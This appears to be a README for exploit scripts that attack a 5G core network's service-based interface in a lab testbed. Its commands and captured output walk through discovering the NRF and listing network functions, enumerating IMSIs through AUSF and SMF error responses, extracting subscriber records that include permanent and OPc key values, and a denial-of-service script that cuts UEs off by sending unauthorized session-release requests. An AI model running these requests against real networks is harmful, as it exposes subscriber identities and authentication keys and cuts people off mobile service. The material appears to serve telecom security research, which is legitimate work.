
# The service based interface as an attack vector

## Table of Contents
1. [Finding functions of IP addresses](#find)
	1. [Identify NRF](#find)
	2. [Get NF SBI Data](#findnfs)
2. [Checking UEs](#ue)
    1. [Get IMSIs from AUSF](#imsi)
    2. [Get UE Registration Data and More](#regs)
3. [Targeting the SMF](#smf)
	1. [Get IMSIs and Session Data](#smfimsi)
	2. [SMF UE DOS with unauthorized Session Release](#smfdos)

## Finding functions of IP addresses <div id='find'/>

After a succesfull NMAP scan you probably have a range of ip addresses that you suspect to be a NFs. You can use the SBI to find out which is a NRF and from there what the other NFs are.

 
```console
user@ue_vm:~/5G/UE_VM/Exploit_Scripts/SBI$ ./find_nrf.sh -n <list of suspected nrfs> -i <interface>
```

### Checking NFs (Get NF SBI Data)  <div id='findnfs'/>

If you ask the nrf it will respond with all the registered nfs.

```console
user@ue_vm:~/UERANSIM/build$ ./nr-binder 10.45.0.29 nghttp http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances
{
	"_links":	{
		"items":	[{
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/4424e10c-b91f-41ed-b63c-6de5d08235f5"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/(null)"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/43d16e14-b91f-41ed-b49c-f98481dc4b43"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/44cae8fe-b91f-41ed-b183-37f999dfcad0"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/443fb23e-b91f-41ed-a76b-27c3b6dd6eb0"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/4480ec36-b91f-41ed-bbb3-f312db251f3b"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/445bb7a4-b91f-41ed-807f-159b80cdce04"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/43ccaa6e-b91f-41ed-9c82-59e9ae72412b"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/44b4ba20-b91f-41ed-bcf2-15223ef57432"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/4495ab30-b91f-41ed-937f-9fe1903c6cb7"
			}],
		"self":	{
			"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances"
		}
	}
}

```

Now we can check every indvidual uri and find out more about the NFs, here we choose a single href and see what we get.

```console
user@ue_vm:~/UERANSIM/build$  ./nr-binder 10.45.0.29 nghttp http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/43ccaa6e-b91f-41ed-9c82-59e9ae72412b
{
	"nfInstanceId":	"43ccaa6e-b91f-41ed-9c82-59e9ae72412b",
	"nfType":	"AMF",
	"nfStatus":	"REGISTERED",
	"heartBeatTimer":	10,
	"ipv4Addresses":	["10.0.3.1"],
	"allowedNfTypes":	["SMF", "SCP"],
	"priority":	0,
	"capacity":	100,
	"load":	0,
	"nfServiceList":	{
		"43ccd6d8-b91f-41ed-9c82-59e9ae72412b":	{
			"serviceInstanceId":	"43ccd6d8-b91f-41ed-9c82-59e9ae72412b",
			"serviceName":	"namf-comm",
			"versions":	[{
					"apiVersionInUri":	"v1",
					"apiFullVersion":	"1.0.0"
				}],
			"scheme":	"http",
			"nfServiceStatus":	"REGISTERED",
			"ipEndPoints":	[{
					"ipv4Address":	"10.0.3.1",
					"port":	7777
				}],
			"allowedNfTypes":	["SMF"],
			"priority":	0,
			"capacity":	100,
			"load":	0
		}
	},
	"nfProfileChangesSupportInd":	true
}
```

The script ```find_nfs.sh``` does the top two actions together, requests the nrf for all registered nfs and then asks for more information on each.

```console
user@ue_vm:~/5G/UE_VM/Exploit_Scripts/SBI$ ./check_nr.sh -n <nrf_ip> -i <interface> 
```

Now we have the addresses functions and various other information of all NFs connected to the nrf.


## Checking UEs <div id='ue'/>

A lot of information can be accessed about the registered UEs with unauthorized SBI requests.

### Get IMSI with AUSF <div id='imsi'/>

We can leverage the error responses from the AUSF to find which IMSIs are currently in use. This is occurs when we send an unexpected put request to the ausf with session ids starting at 0 and increasing till we no longer get IMSIs. For every imsi that is registered the AUSF will return the IMSI that is associated to the AUSF seid being requested. The srcipt [find_ues.sh](find_ues.sh) performs exactly that. 

```console
user@ue_vm:~/5G/UE_VM/Exploit_Scripts/SBI$ ./find_ues.sh -s <starting seid> -e <ending seid> -i <interface to send from> -a <ausf ip address>
```

Each request will return an error message with an IMSI or without depending on if the seid is in use. 

```console
nghttp --header=':method: PUT' --header='Content-Type: application/json' -d json/ausf_put http://10.0.4.1:7777/nausf-auth/v1/ue-authentications/2/5g-aka-confrimation
{
	"title":	"HTTP response error",
	"status":	400,
	"detail":	"suci-0-901-70-0000-0-0-0000000001"
}
{
	"type":	"/nausf-auth/v1",
	"title":	"Not found",
	"status":	404,
	"detail":	"PUT",
	"instance":	"/ue-authentications/5"
}
``` 

In the above example you can see an example nghttp command for the put request which [find_ues.sh](find_ues.sh) uses, and the two types of possible responses.

### Leveraging IMSI to get UE Data <div id='regs'/>

If we have the UE imsis we can find out really everything we could need to know about a particular UE. Even their slice, dnn, encPermanentKey, sequenceNumber, and encOpcKey information. Everything we need to use their data for a connection. If you dont know their IMSI you can just test random imsis until you find one (If you dont have access to the AUSF for example). 

```console
user@ue_vm:~/5G/UE_VM/Exploit_Scripts/SBI$ ./check_ue.sh -m <udm_ip> -r <udr_ip> -i <interface> -u <ue_imsi> 
nghttp http://10.0.15.1:7777/nudm-sdm/v2/imsi-901700000000001/smf-select-data

{
	"subscribedSnssaiInfos":	{
		"{\n\t\"sst\":\t1\n}":	{
			"dnnInfos":	[{
					"dnn":	"internet",
					"defaultDnnIndicator":	true
				}]
		}
	}
} nghttp http://10.0.15.1:7777/nudm-sdm/v2/imsi-901700000000001/am-data

{
	"subscribedUeAmbr":	{
		"uplink":	"1048576 Kbps",
		"downlink":	"1048576 Kbps"
	},
	"nssai":	{
		"defaultSingleNssais":	[{
				"sst":	1
			}]
	}
}
 nghttp http://10.0.15.1:7777/nudm-sdm/v2/imsi-901700000000001/ue-context-in-smf-data

{
}
 nghttp http://10.0.15.1:7777/nudm-sdm/v2/imsi-901700000000001/sm-data?dnn=internet&single-nssai={"sst":1}

[{
		"singleNssai":	{
			"sst":	1
		},
		"dnnConfigurations":	{
			"internet":	{
				"pduSessionTypes":	{
					"defaultSessionType":	"IPV4V6",
					"allowedSessionTypes":	["IPV4", "IPV6", "IPV4V6"]
				},
				"sscModes":	{
					"defaultSscMode":	"SSC_MODE_1",
					"allowedSscModes":	["SSC_MODE_1", "SSC_MODE_2", "SSC_MODE_3"]
				},
				"5gQosProfile":	{
					"5qi":	9,
					"arp":	{
						"priorityLevel":	8,
						"preemptCap":	"NOT_PREEMPT",
						"preemptVuln":	"NOT_PREEMPTABLE"
					},
					"priorityLevel":	8
				},
				"sessionAmbr":	{
					"uplink":	"1048576 Kbps",
					"downlink":	"1048576 Kbps"
				}
			}
		}
	}]
 nghttp http://10.0.16.1:7777/nudr-dr/v1/subscription-data/imsi-901700000000001/authentication-data/authentication-subscription

{
	"authenticationMethod":	"5G_AKA",
	"encPermanentKey":	"465b5ce8b199b49faa5f0a2ee238a6bc",
	"sequenceNumber":	{
		"sqn":	"000000001fc1"
	},
	"authenticationManagementField":	"8000",
	"encOpcKey":	"e8ed289deba952e4283b54e88e6183ca"
}

```

## SMF  <div id='smf'/>

The SMF has shown to be particullarily vulnerable to SBI based attacks. 

### Get SMF Session Data and IMSI  <div id='smfimsi'/>

For the [PFCP](../PFCP) based attacks to be performed in a targeted manner the SEID of the UE is needed to be known. If there is a one to one mapping of SMFs to UPFs the SMF seid will typically be the same as the UPF seid. If not the SMF seid can still be used to in conjunction with the ue based dnn and slice data to help increase the liklihood of a correct guess of the UPF SEID. 

The SMF SEID can like the with AUSF be found using the responses to error messages. The script [find_ues_smf.sh](find_ues_smf.sh) works very similarrily to [find_ues.sh](find_ues.sh). 


```console
user@ue_vm:~/5G/UE_VM/Exploit_Scripts/SBI$ ./find_ues_smf.sh -s <starting seid> -e <ending seid> -i <interface to send from> -a <smf ip address>
```

An example of the nghttp request used by [find_ues_smf.sh](find_ues_smf.sh) can be seen in the below request:

```console
nghttp --header=':method: POST' --header='Content-Type: application/json' -d json/empty.json http://10.0.14.1:7777/nsmf-pdusession/v1/sm-contexts/4/modify
```

An empty json is posted in the smf contexts and an error is returned as the json is not in the form that the SMF expects. In the error the SMF returns the IMSI that corresponds to the SEID which is in the above example 4.

### SMF UE DOS with unauthorized Session Release  <div id='smfdos'/>

Once we have the SEID we are able to perform a DOS attack on the UE associated to that IMSI by sending an unauthorized session release request to the SMF>

The script [sbi_dos.sh](sbi_dos.sh) performs this attack on sessions between the given start and end point.

```console
user@ue_vm:~/5G/UE_VM/Exploit_Scripts/SBI$ ./sbi_dos.sh -s <starting seid> -e <ending seid> -i <interface to send from> -a <smf ip address>
```

An example of the nghttp request used in [sbi_dos.sh](sbi_dos.sh) can be seen below:

```console
nghttp --header=':method: POST' --header='Content-Type: application/json' -d json/empty.json http://10.0.14.1:7777/nsmf-pdusession/v1/sm-contexts/4/release
```

The unauthorized SBI POST request releases a SMF context resulting in the session being deleted for all relevant NFs and the UE no longer having access to the DN. This porccess can be seen below:

![image](../../../Media/sbi_smf_dos.gif)
